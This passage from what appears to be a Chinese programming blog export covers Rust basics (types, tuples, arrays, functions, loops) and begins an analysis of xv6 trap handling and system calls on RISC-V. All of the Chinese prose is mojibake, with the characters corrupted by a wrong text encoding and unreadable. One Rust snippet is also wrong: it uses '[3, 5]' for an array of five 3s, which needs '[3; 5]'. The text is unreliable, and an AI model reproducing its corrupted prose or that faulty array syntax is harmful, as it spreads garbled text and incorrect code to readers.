f64ï¼Œé»˜è®¤ä¸º f64 ç±»å‹ï¼Œç²¾åº¦æ›´é«˜ å¸ƒå°”å‹ booltrue å’Œ false ä¸¤ä¸ªå€¼ å­—ç¬¦å‹ char12let c = 'z';let heart_eyed_cat: char = 'ğŸ˜»'; è¿™é‡Œçš„ char å¤§å°æ˜¯å››ä¸ªå­—èŠ‚ï¼ŒUnicode ç¼–ç ï¼Œå¯ä»¥è¡¨ç¤ºæ¯” ASCII æ›´å¤šçš„å†…å®¹ï¼Œå¦‚ä¸­æ—¥éŸ©æ–‡ã€emoji ç­‰ å­—ç¬¦å‹çš„å€¼å¿…é¡»ä½¿ç”¨å•å¼•å·è¡¨ç¤ºï¼ŒåŒå¼•å·ä¸ºå­—ç¬¦ä¸² å¤åˆç±»å‹å…ƒç»„ tupleå…ƒç»„å¯ä»¥å°†å¤šä¸ªç±»å‹çš„å€¼ç»„åˆè¿›ä¸€ä¸ªå¤åˆç±»å‹ï¼Œé•¿åº¦ä¸å¯å˜ï¼Œç±»ä¼¼ C è¯­è¨€çš„ç»“æ„ä½“ 1let tup: (i32, f64, u8) = (500, 6.4, 1); ç±»å‹å¯çœç•¥ï¼Œçœç•¥åä¸ºé»˜è®¤ç±»å‹ ä»å…ƒç»„ä¸Šå–å€¼ 12345678let tup: (i32, f64, u8) = (500, 6.4, 1);// è§£æ„ï¼Œdestructuringlet (x, y, z) = tup;// ç´¢å¼•let x = tup.0;let y = tup.1;let z = tup.2; ä¸å¸¦ä»»ä½•å€¼çš„å…ƒç»„ï¼Œç§°ä¸ºå•å…ƒå…ƒç»„ æ•°ç»„ arrayæ•°ç»„çš„å…ƒç´ ç±»å‹å¿…é¡»ç›¸åŒï¼Œé•¿åº¦å›ºå®š 12345678910// æ•°ç»„å£°æ˜let a = [1, 2, 3, 4];// é•¿åº¦ä¸º 4ï¼Œå…ƒç´ ç±»å‹ä¸º i32 çš„æ•°ç»„let a: [i32; 4] = [1, 2, 3, 4];// é•¿åº¦ä¸º 5ï¼Œå…ƒç´ å…¨ä¸º 3 çš„æ•°ç»„let a = [3, 5];// æ•°ç»„å…ƒç´ è®¿é—®let first = a[0]; è¶Šç•Œè®¿é—®ä¼šç›´æ¥å¯¼è‡´ panicï¼Œè¿™æ˜¯ Rust çš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶ å‡½æ•°ä½¿ç”¨ fn å…³é”®å­—å£°æ˜å‡½æ•°ï¼Œå‡½æ•°åå’Œå˜é‡åä½¿ç”¨ snake case è§„èŒƒé£æ ¼ï¼Œå­—æ¯å…¨éƒ¨å°å†™ Rust ä¸åƒ C è¯­è¨€éœ€è¦åœ¨ è°ƒç”¨å‡½æ•° çš„å‰é¢å£°æ˜ è¢«è°ƒç”¨å‡½æ•° 12345678910111213fn {func_name} ({var_name1}: {var_type1}, ..) -&gt; {ret_type}{ ...}fn main() { let x = 1; let y = 2; println!(&quot;{x} + {y} = {}&quot;, my_func(x, y));}fn my_func(x: i32, y: i32) -&gt; i32 { return x + y;} å¿…é¡»æŒ‡å®šå‚æ•°ç±»å‹ è¡¨è¾¾å¼å’Œè¯­å¥Rust æ˜¯åŸºäºè¡¨è¾¾å¼çš„è¯­è¨€ è¡¨è¾¾å¼ï¼šè®¡ç®—å¹¶äº§ç”Ÿä¸€ä¸ªå€¼ã€‚å¤§éƒ¨åˆ† Rust ä»£ç ç”±è¡¨è¾¾å¼ç»„æˆï¼Œæ•°å­¦è¿ç®—ã€å‡½æ•°è°ƒç”¨ã€å®è°ƒç”¨ã€å¤§æ‹¬å·åˆ›å»ºçš„å—ä½œç”¨äºéƒ½æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ è¯­å¥ï¼šæ‰§è¡Œä¸€äº›æ“ä½œä½†ä¸è¿”å›å€¼çš„æŒ‡ä»¤ã€‚å½“è¡¨è¾¾å¼ç»“å°¾åŠ ä¸Šåˆ†å·æ—¶ï¼Œå®ƒå°±å˜æˆäº†è¯­å¥ã€‚å‡½æ•°å®šä¹‰ä¹Ÿæ˜¯ä¸€ä¸ªè¯­å¥ 123456789let y = { let x = 3; x + 1};println!(&quot;{y}&quot;)// output: // 4 è¿™é‡Œçš„ä»£ç å— {let x = 3; x + 1} ç”±äºç»“å°¾æ²¡æœ‰åˆ†å·ï¼Œæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›å€¼æ˜¯ 4 åœ¨æœ‰è¿”å›å€¼çš„å‡½æ•°ä¸­å¯ä»¥ä¸»åŠ¨ä½¿ç”¨ return è¿”å›å€¼ï¼Œä¹Ÿå¯ä»¥éšå¼åœ°è¿”å›å‡½æ•°ä¸­æœ€åçš„è¡¨è¾¾å¼ 1234567fn my_func(x: i32, y: i32) -&gt; i32 { return x + y;}fn my_func(x: i32, y: i32) -&gt; i32 { x + y} åœ¨è¿”å›è¡¨è¾¾å¼æ—¶ï¼Œç»“å°¾ä¸å¯åŠ åˆ†å·ï¼Œå¦åˆ™å®ƒå°±ä¸æ˜¯è¡¨è¾¾å¼äº† æ§åˆ¶æµRust ä¸­æ§åˆ¶æµçš„è¡¨è¾¾å¼å¿…é¡»è¿”å› bool ç±»å‹ if-else1234567891011let number = 6;if number % 4 == 0 { println!(&quot;number is divisible by 4&quot;);} else if number % 3 == 0 { println!(&quot;number is divisible by 3&quot;);} else if number % 2 == 0 { println!(&quot;number is divisible by 2&quot;);} else { println!(&quot;number is not divisible by 4, 3, or 2&quot;);} åœ¨ let è¯­å¥ä¸­ä½¿ç”¨ if-else 1234567let condition = true;let number = if condition { 5 } else { 6 };println!(&quot;The value of number is: {number}&quot;);// output:// 5 loopã€whileã€for12345678910111213141516171819// æ— é™å¾ªç¯loop { println!(&quot;again!&quot;);}let a = [1, 2, 3, 4, 5];let mut i = 0;// ä¸¤ç§éå†æ•°ç»„çš„æ–¹å¼while i &lt; a.len() { println!(&quot;a[{i}] = {}&quot;, a[i]); i += 1;}// 0..a.len() ç›¸å½“äº Python çš„ range(0, len(a))for i in 0..a.len() { println!(&quot;a[{i}] = {}&quot;, a[i]);} breakã€continue ç®€å•çš„ breakã€continue å¯ä»¥è·³å‡ºä¸€å±‚å¾ªç¯ breakã€continue ååŠ ä¸Šè¡¨è¾¾å¼ï¼Œå¯ä»¥è¿”å›å€¼ æƒ³è¦è·³å‡ºåµŒå¥—å¾ªç¯ï¼Œåœ¨æŒ‡å®šå¾ªç¯å‰æ ‡è®°ä¸€ä¸ªå¾ªç¯æ ‡ç­¾ï¼Œä¸ break æˆ– continue ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥ä½œç”¨äºæ ‡è®°çš„å¾ªç¯ï¼Œå¾ªç¯æ ‡ç­¾å‰éœ€è¦åŠ å•å¼•å· ' 12345678910111213141516171819202122232425262728293031323334loop { println!(&quot;again!&quot;); break;}// res = 20let res = loop { counter += 1; if counter == 10 { break counter * 2; }}// åµŒå¥—å¾ªç¯let mut count = 0;'counting_up: loop { println!(&quot;count = {count}&quot;); let mut remaining = 10; loop { println!(&quot;remaining = {remaining}&quot;); if remaining == 9 { break; } if count == 2 { break 'counting_up; } remaining -= 1; } count += 1;}println!(&quot;End count = {count}&quot;);","link":"/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/"},{"title":"Xv6 å‰–æ","text":"ä¸ªäººå¯¹ xv6 è¿™ä¸ªç®€æ˜“æ“ä½œç³»ç»Ÿå†…æ ¸æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œå°±æƒ³å†™ä¸€ä¸ªå‰–æï¼Œçœ‹çœ‹ xv6 éƒ½æ˜¯æ€ä¹ˆå®ç°è¿™äº›åŠŸèƒ½çš„ï¼ŒåšæŒä¸€å‘¨æ›´ä¸€ä¸ªè¯é¢˜ é¢„å¤‡çŸ¥è¯†å¯ä»¥ç›´æ¥è¯»ä¸‹é¢çš„è¯é¢˜ï¼Œè¿™é‡Œæ˜¯ä¾¿äºè¯»æ­¤æ–‡ç« æ—¶å¿«é€Ÿäº†è§£ å…³äº xv6xv6 æ˜¯ä¸€ä¸ªåŸºäº RISC-V 64 ä½æ¶æ„ CPU çš„ç±» Unix ç®€æ˜“æ“ä½œç³»ç»Ÿ å¯„å­˜å™¨é€šç”¨å¯„å­˜å™¨ Register ABI Name Description Saver x0 zero Hard-wired zero - x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer - x4 tp Thread pointer - x5-7 t0-2 Temporaries Caller x8 s0/fp Saved register / frame pointer Callee x9 s1 Saved register Callee x10-x11 a0-1 Function arguments / return values Caller x12-x17 a2-7 Function arguments Caller x18-27 s2-11 Saved registers Callee x28-31 t3-6 Temporaries Caller åœ¨æ±‡ç¼–ä¸­ä¸€èˆ¬ä½¿ç”¨å¯„å­˜å™¨çš„ ABI åå­— è¿˜æœ‰ f å¼€å¤´çš„å¯„å­˜å™¨ï¼Œç”¨äºæµ®ç‚¹æ•°ï¼Œæ²¡æœ‰åˆ—ä¸¾å‡ºæ¥ ra ä¿å­˜å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ s0/fpã€sp ç”¨äºä¿å­˜æ ˆåº•å’Œæ ˆé¡¶ï¼Œæ³¨æ„ s0 å’Œ fp æ˜¯åŒä¸€ä¸ªå¯„å­˜å™¨ tp ä¿å­˜å½“å‰ CPU æ ¸ id a0 è¿˜ç”¨äºä¿å­˜å‡½æ•°è¿”å›å€¼ Saver å‡½æ•°ä¹‹é—´é™¤äº† a0 å¯„å­˜å™¨ä¼ é€’è¿”å›å€¼å¤–ï¼Œåº”è¯¥ä¸èƒ½äº’ç›¸å½±å“ï¼Œå› æ­¤å…¶ä»–å¯„å­˜å™¨éœ€è¦è¢«ä¿å­˜ä¸‹æ¥ï¼ŒSaver æŒ‡å®šå½“å‰å‡½æ•°çš„å¯„å­˜å™¨æ˜¯ç”±è°ƒç”¨å‡½æ•°è¿˜æ˜¯è¢«è°ƒç”¨å‡½æ•°ä¿å­˜ Callerï¼šè°ƒç”¨å‡½æ•° Caller åœ¨å‡½æ•°å¼€å§‹å°±å¯ä»¥é€‰æ‹© Caller ç±»å¯„å­˜å™¨ä¿å­˜ä¸‹æ¥ï¼Œä¸€èˆ¬åªä¿å­˜ raï¼Œå…·ä½“ç”±ç¼–è¯‘å™¨é€‰æ‹© Calleeï¼šè¢«è°ƒç”¨å‡½æ•° Callee åªä¿å­˜å®ƒä¼šç”¨åˆ°çš„ Callee ç±»å¯„å­˜å™¨ï¼Œåœ¨è¿”å›åˆ° Caller å‰æ¢å¤ ä¸ºä»€ä¹ˆè¦åˆ†å¼€ä¿å­˜å‘¢ï¼Ÿ Callee ç±»çš„å¯„å­˜å™¨ä¸èƒ½ç¡®å®šä¸‹å±‚å‡½æ•°ä¼šä¸ä¼šç”¨åˆ°ï¼Œè€Œä¸”éšæ—¶ä¼šå˜åŒ–ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°å‰åéƒ½å­˜å–ä¸€éï¼Œæ€§èƒ½ä¼šé™ä½å¾ˆå¤šï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œç”±è¢«è°ƒç”¨è€…æ¥ä¿å­˜æ›´åŠ åˆé€‚ æ§åˆ¶çŠ¶æ€å¯„å­˜å™¨CSRï¼ˆControl Status Registerï¼‰ pcï¼šæŒ‡å‘ä¸‹ä¸€æ¡å°†è¦æŒ‡å‘æŒ‡ä»¤çš„åœ°å€ Program Counter satpï¼šä¿å­˜ä¸€çº§é¡µè¡¨çš„ç‰©ç†åœ°å€ Supervisor Address Translation and Protection stvecï¼šä¿å­˜å‘ç”Ÿ trap æ—¶è·³è½¬çš„åœ°å€ Supervisor Trap Vector Base Address Register ç”¨æˆ·æ¨¡å¼ä¸‹ä¼šæŒ‡å‘ kernel/trapmpoline.S çš„ uservec ç®¡ç†è€…æ¨¡å¼ä¸‹ä¼šæŒ‡å‘ kernel/kernelvec.S çš„ kernelvec sepcï¼šä¿å­˜å‘ç”Ÿ trap æ—¶ pc çš„å€¼ï¼Œä¾¿äºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹ Supervisor Exception Program Counter å†…æ ¸å¯æ§åˆ¶ sepc è®© sret è¿”å›åˆ°é€‚å½“çš„ä½ç½® scauseï¼šè®°å½•å‘ç”Ÿ trap çš„åŸå› ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªåšè¿›ä¸€æ­¥å¤„ç† Supervisor Cause Register 8 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ å…¶ä»–è¡¨ç¤ºé”™è¯¯æˆ–è€…ä¸­æ–­ sstatusï¼šä»¥ bitmap å½¢å¼ä¿å­˜ä¸€äº›æ§åˆ¶ä¿¡æ¯ Supervisor Status Register SPPï¼šè¡¨ç¤º trap æ¥è‡ªç”¨æˆ·æ¨¡å¼è¿˜æ˜¯ç®¡ç†è€…æ¨¡å¼ï¼Œå¹¶ç”¨æ¥å‘Šè¯‰ sret è¿”å›åˆ°å“ªä¸ªæ¨¡å¼ SIEï¼šè¡¨ç¤ºåœ¨ç®¡ç†è€…æ¨¡å¼ä¸‹æ˜¯å¦å…è®¸è®¾å¤‡ä¸­æ–­ï¼Œ0 è¡¨ç¤ºç¦æ­¢ï¼ŒRISC-V ä¼šæ¨è¿Ÿè®¾å¤‡ä¸­æ–­ sscatchï¼šåœ¨å†…æ ¸æ€ä¸ç”¨æˆ·æ€æ—¶èµ·è¾…åŠ©ä½œç”¨ ä¸€èˆ¬ç”¨æ¥ä¿å­˜ a0 åœ¨ xv6 çš„ 2020 ç‰ˆæœ¬ç”¨æ¥ä¿å­˜ trapframe åœ°å€ æ±‡ç¼–æŒ‡ä»¤ csrrã€csrw ç”¨äºè¯»å†™ CSR sfence.vma æ¸…ç©º TLB ç¼“å­˜ ecallï¼ˆEnvironment Callï¼‰ å°†æ¨¡å¼ä»ç”¨æˆ·æ¨¡å¼æ›´æ”¹ä¸ºç®¡ç†è€…ï¼ˆsupervisorï¼‰æ¨¡å¼ å°† pc å¯„å­˜å™¨ä¿å­˜åˆ° sepc å¯„å­˜å™¨ å°† pc å¯„å­˜å™¨æ”¹ä¸º stvec å¯„å­˜å™¨å€¼ å…³é—­è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 0ï¼‰ sretï¼ˆSupervisor Returnï¼‰ å°†æ¨¡å¼ä»ç®¡ç†è€…æ¨¡å¼æ›´æ”¹ä¸ºæŒ‡å®šçš„æ¨¡å¼ï¼ˆsstatus çš„ SPP ä½ï¼‰ å°† pc å¯„å­˜å™¨æ”¹ä¸º sepc å¯„å­˜å™¨å€¼ å¯ç”¨è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 1ï¼‰ åœ°å€ç©ºé—´ tramplineï¼šåœ¨å†…æ ¸é¡µè¡¨å’Œç”¨æˆ·é¡µè¡¨ä¸­éƒ½æœ‰æ˜ å°„ï¼Œä½œä¸ºç”¨æˆ·è¿›ç¨‹åˆ‡æ¢åˆ°å†…æ ¸çš„è·³æ¿ï¼Œæ”¾åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„é¡¶éƒ¨ï¼ˆ0x3ffffff000ï¼‰ï¼Œå¤§å°ä¸ºä¸€é¡µ trapframeï¼šåœ¨ç”¨æˆ·é¡µè¡¨ä¸­æœ‰æ˜ å°„ï¼Œç”¨äºåˆ‡æ¢åˆ°å†…æ ¸æ—¶ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œæ”¾åœ¨ trampoline ä¸‹é¢ï¼ˆ0x3fffffe000ï¼‰ï¼Œå¤§å°ä¸ºä¸€é¡µ å…¶ä»–kernel/proc.h123456struct cpu { struct proc *proc; // The process running on this cpu, or null. struct context context; // swtch() here to enter scheduler(). int noff; // Depth of push_off() nesting. int intena; // Were interrupts enabled before push_off()?}; proc ä¿å­˜å½“å‰ CPU æ ¸è¿è¡Œçš„è¿›ç¨‹ context ä¿å­˜å†…æ ¸ç”¨äºè°ƒåº¦åŠŸèƒ½çš„çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ æ€ä¹ˆåœ¨å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´åˆ‡æ¢åœ¨ RISC-V ä¸­ï¼Œæœ‰ä¸‰ç§ trap ç³»ç»Ÿè°ƒç”¨ ç¡¬ä»¶ä¸­æ–­ å¼‚å¸¸ åœ¨ç”¨æˆ·è¿›ç¨‹ä¸­å‘ç”Ÿ trap æ—¶ï¼Œéœ€è¦é™·å…¥åˆ°å†…æ ¸ä¸­è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œåå†…æ ¸ä¼šæ ¹æ®æƒ…å†µå›åˆ°ç”¨æˆ·è¿›ç¨‹æˆ–è€…æ€æ­»ç”¨æˆ·è¿›ç¨‹ï¼Œè¿™å…¶ä¸­å°±æ¶‰åŠåˆ°å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´çš„åˆ‡æ¢ åˆ‡æ¢è¿‡ç¨‹å‘ç”Ÿ trap æ—¶ï¼Œç¡¬ä»¶ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œ å°† sstatus ä¸­çš„ SIE ä½æ¸…é›¶ï¼Œç¦ç”¨è®¾å¤‡ä¸­æ–­ä»¥é˜²æ­¢å¹²æ‰°ï¼Œå¦‚æœè¿™ä¸ª trap æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œä¸ä¼šåšä»¥ä¸‹æ“ä½œ å°†æ¨¡å¼ä»ç”¨æˆ·æ¨¡å¼æ›´æ”¹ä¸ºç®¡ç†è€…æ¨¡å¼ å°† pc å¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ° sepc å¯„å­˜å™¨ä¸­ å°†å½“å‰æ¨¡å¼ï¼ˆç”¨æˆ·æˆ–è€…ç®¡ç†è€…ï¼‰ä¿å­˜åˆ° sstatus å¯„å­˜å™¨çš„ SPP ä½ è®¾ç½® scause å¯„å­˜å™¨çš„å€¼åæ˜  trap åŸå›  å°† stvec å¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ° pc å¯„å­˜å™¨ä¸­ æ­¤æ—¶ pc æŒ‡å‘ trampolineï¼Œå¼€å§‹æ‰§è¡Œï¼Œæ³¨æ„ï¼Œæ­¤æ—¶é¡µè¡¨å¯„å­˜å™¨å¹¶æ²¡æœ‰ä¾¿ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜ä½¿ç”¨ç€ç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨ kernel/trapoline.S123456789101112131415161718192021222324252627282930313233343536.globl uservecuservec: # ç¼“å­˜ a0 csrw sscratch, a0 # æŠŠ trapframe åœ°å€æ”¾åˆ° a0 ä¸­ li a0, TRAPFRAME # æŠŠç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åˆ° trapframe ä¸­ï¼Œkernel/proc.h ä¸­å¯¹åº”ç€å˜é‡åœ°å€ sd ra, 40(a0) sd sp, 48(a0) # æ­¤å¤„çœç•¥... sd t5, 272(a0) sd t6, 280(a0) # å†æŠŠåŸ a0 çš„å€¼ä¿å­˜è¿›å» csrr t0, sscratch sd t0, 112(a0) # ä» trapframe ä¸­å–å‡ºå†…æ ¸æ ˆçš„æŒ‡é’ˆã€CPU æ ¸çš„ idã€å¤„ç† trap çš„åœ°å€ã€å†…æ ¸é¡µè¡¨ ld sp, 8(a0) ld tp, 32(a0) ld t0, 16(a0) ld t1, 0(a0) # æ¸…ç©º TLB ç¼“å­˜ï¼Œè¿™é‡Œè‹±æ–‡æ³¨é‡Šæ˜¯è¯´ sfence.vma zero, zero # åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨ csrw satp, t1 # æ¸…ç©º TLB ç¼“å­˜ sfence.vma zero, zero # è·³è½¬åˆ°å¤„ç† trap çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ kernel/trap.c çš„ usertrap å‡½æ•°åœ°å€ jr t0 æ€»ç»“ï¼š å°†ç”¨æˆ·è¿›ç¨‹çš„å¯„å­˜å™¨ä¿å­˜åˆ° trapframe ä¸­ åˆ‡æ¢å†…æ ¸æ ˆï¼Œå†…æ ¸çº¿ç¨‹ idï¼Œå†…æ ¸é¡µè¡¨ è·³è½¬åˆ° kernel/trap.c çš„ usertrap å‡½æ•° uservec ä¸»è¦å°±æ˜¯åšå¥½åˆ‡æ¢åˆ°å†…æ ¸çš„å‡†å¤‡ kernel/trap.c12345678910111213141516171819202122232425262728293031323334voidusertrap(void){ // ... // è®¾ç½® stvec ä¸º kernelvecï¼Œå¦‚æœæ­¤æ—¶å‘ç”Ÿäº† trap ä¼šè·³è½¬åˆ° kernelvec è¿›è¡Œå¤„ç† w_stvec((uint64)kernelvec); struct proc *p = myproc(); // ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ pc åˆ° trapframe p-&gt;trapframe-&gt;epc = r_sepc(); if(r_scause() == 8){ // ç³»ç»Ÿè°ƒç”¨ // ... } else if((which_dev = devintr()) != 0){ // è®¾å¤‡ä¸­æ–­ // ... } else { // å…¶ä»–å¼‚å¸¸ // ... } // å¦‚æœç”¨æˆ·è¿›ç¨‹è¢«æ€æ­»å°±é€€å‡º if(killed(p)) exit(-1); // å¦‚æœæ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œåˆ™è¿›è¡Œè¿›ç¨‹è°ƒåº¦ if(which_dev == 2) yield(); usertrapret();} æ€»ç»“ï¼š æŠŠ stvec æ”¹æˆ kernelvec ä»¥å¤„ç†å‘ç”Ÿåœ¨å†…æ ¸çš„ trap ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ pc åˆ° trapframe æ ¹æ® scauseã€devintr å¤„ç† trap æ£€æŸ¥æ˜¯å¦è®¡æ—¶å™¨ä¸­æ–­ï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œè¿›ç¨‹è°ƒåº¦ æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»ï¼Œè‹¥æ˜¯åˆ™é€€å‡º è·³è½¬åˆ° usertrapret å‡½æ•° usertrap ä¸»è¦å°±æ˜¯æ ¹æ® trap ç±»å‹å¤„ç† trap kernel/trap.c12345678910111213141516171819202122232425262728293031323334353637voidusertrapret(void){ struct proc *p = myproc(); // å…³é—­è®¾å¤‡ä¸­æ–­ intr_off(); // æŠŠ uservec çš„åœ°å€å†™å…¥ stvec å¯„å­˜å™¨ uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline); w_stvec(trampoline_uservec); // ä¿å­˜å†…æ ¸é¡µè¡¨ã€å†…æ ¸æ ˆã€usertrap åœ°å€ã€CPU æ ¸ id p-&gt;trapframe-&gt;kernel_satp = r_satp(); // kernel page table p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; // process's kernel stack p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap; p-&gt;trapframe-&gt;kernel_hartid = r_tp(); // hartid for cpuid() // set up the registers that trampoline.S's sret will use // to get to user space. // è®¾ç½® sstatus å¯„å­˜å™¨ unsigned long x = r_sstatus(); x &amp;= ~SSTATUS_SPP; // SPP ä½æ¸…é›¶ï¼Œä»¥ä¾¿ sret è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ x |= SSTATUS_SPIE; // SPIE ä½ç½® 1ï¼Œå…è®¸ç”¨æˆ·æ¨¡å¼ä¸‹è®¾å¤‡ä¸­æ–­ w_sstatus(x); // æŠŠç”¨æˆ·è¿›ç¨‹çš„ pc å†™å…¥ sepc w_sepc(p-&gt;trapframe-&gt;epc); // å–å‡ºç”¨æˆ·é¡µè¡¨ uint64 satp = MAKE_SATP(p-&gt;pagetable); // å–å‡º userret åœ°å€ï¼Œå‡†å¤‡è°ƒç”¨ï¼Œå¹¶ä¼ é€’ç”¨æˆ·é¡µè¡¨è¿›å» uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline); ((void (*)(uint64))trampoline_userret)(satp);} æ€»ç»“ï¼š ä¿å­˜å†…æ ¸é¡µè¡¨ã€å†…æ ¸æ ˆã€CPU æ ¸çš„ id é…ç½® sstatus å¯„å­˜å™¨ è°ƒç”¨ userret å¹¶ä¼ é€’ç”¨æˆ·é¡µè¡¨ usertrapret ä¸»è¦æ˜¯å¤„ç† trap åä¸ºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹åšå‡†å¤‡ kernel/trampoline.S1234567891011121314151617globl userretuserret: # è½¬æ¢åˆ°ç”¨æˆ·é¡µè¡¨ sfence.vma zero, zero csrw satp, a0 sfence.vma zero, zero # ä» trapframe ä¸­å–å‡ºç”¨æˆ·è¿›ç¨‹çš„å¯„å­˜å™¨å€¼ li a0, TRAPFRAME ld ra, 40(a0) ld sp, 48(a0) # æ­¤å¤„çœç•¥... ld t6, 280(a0) ld a0, 112(a0) # è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼å’Œç”¨æˆ·è¿›ç¨‹çš„ pc æ‰€æŒ‡ä½ç½® sret userret ä¸»è¦æ˜¯æ¢å¤ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå›åˆ°å‘ç”Ÿ trap çš„ä½ç½®ï¼ˆæˆ–è€…å‘ç”Ÿ trap ä½ç½®åé¢ä¸€ä¸ªæŒ‡ä»¤ï¼Œæ¯”å¦‚ ecall åé¢çš„æŒ‡ä»¤ï¼‰ çœæµå°ç»“çœŸçœæµå—ï¼Ÿ ç”¨æˆ·è¿›ç¨‹ -&gt; uservec -&gt; usertrap -&gt; usertrapret -&gt; userret -&gt; ç”¨æˆ·è¿›ç¨‹ å‘ç”Ÿ trap æ—¶ï¼Œç¨‹åºä¼šè·³è½¬åˆ° stvec å¯„å­˜å™¨æŒ‡å‘çš„ kernel/trampoline.S ä¸­çš„ uservec ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶è®¾ç½®å†…æ ¸æ ˆã€å†…æ ¸çº¿ç¨‹ idã€å†…æ ¸é¡µè¡¨ ç„¶åè·³è½¬åˆ° kernel/trap.c ä¸­çš„ usertrap å¯¹ trap è¿›è¡Œå¤„ç† å¦‚æœè¦æ¢å¤åˆ°ç”¨æˆ·è¿›ç¨‹ï¼Œä¼šè·³è½¬åˆ° kernel/trap.c çš„ usertrapret ä¸ºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹åšå‡†å¤‡ æœ€åè·³è½¬åˆ° kernel/trampoline.S ä¸­çš„ userret æ¢å¤ç”¨æˆ·è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå›åˆ°å‘ç”Ÿ trap çš„ä½ç½®ï¼ˆæˆ–è€…å‘ç”Ÿ trap ä½ç½®åé¢ä¸€ä¸ªæŒ‡ä»¤ï¼Œæ¯”å¦‚ ecall åé¢çš„æŒ‡ä»¤ï¼‰ æ€ä¹ˆå®ç°ç³»ç»Ÿè°ƒç”¨åœ¨ user/user.h æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å£°æ˜ user/user.h12345678int fork(void);int exit(int) __attribute__((noreturn));int wait(int*);int pipe(int*);int write(int, const void*, int);int read(int, void*, int);... é‚£ä¹ˆï¼Œå°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç³»ç»Ÿè°ƒç”¨æ˜æ˜æ˜¯è¦ç”¨ ecall æ¥ä½¿ç”¨ï¼Œxv6 æ˜¯æ€ä¹ˆæŠŠç³»ç»Ÿè°ƒç”¨åšæˆä¸€ä¸ªå‡½æ•°ï¼Œä½¿å¾—ç”¨æˆ·ç¨‹åºåƒè°ƒç”¨å‡½æ•°é‚£æ ·è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Ÿ æ€ä¹ˆåˆ¶ä½œç”¨æˆ·ç³»ç»Ÿè°ƒç”¨å‡½æ•°æˆ‘ä»¬å¯ä»¥åœ¨ user/usys.S çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°åœ¨æ±‡ç¼–ä¸­çš„å®šä¹‰ user/usys.S123456789101112131415161718#include &quot;kernel/syscall.h&quot;.global forkfork: li a7, SYS_fork ecall ret.global exitexit: li a7, SYS_exit ecall ret.global waitwait: li a7, SYS_wait ecall ret... å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæ¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°éƒ½åªæ˜¯å°†ç³»ç»Ÿè°ƒç”¨å·ä¼ é€’ç»™ a7ï¼Œç„¶åä½¿ç”¨ ecall è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åè¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•° è€Œå‚æ•°ä¼ é€’æ˜¯ç”¨æˆ·ç¨‹åºåœ¨è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¹‹å‰ï¼Œä¼šæ ¹æ®å‡½æ•°å£°æ˜å°†å‚æ•°ä¼ é€’ç»™å¯¹åº”çš„å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„åœ°å€æ‰§è¡Œ è¿™ä¸ª user/usys.S æ–‡ä»¶å…¶å®æ˜¯ä¸€ä¸ª perl è„šæœ¬ user/usys.pl ç”Ÿæˆçš„ï¼Œä¾¿äºæ·»åŠ ç³»ç»Ÿè°ƒç”¨ å¥½çš„ï¼Œä¸Šé¢è§£é‡Šäº†ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å®ç°ï¼Œä¸‹é¢å°±çœ‹çœ‹ ecall 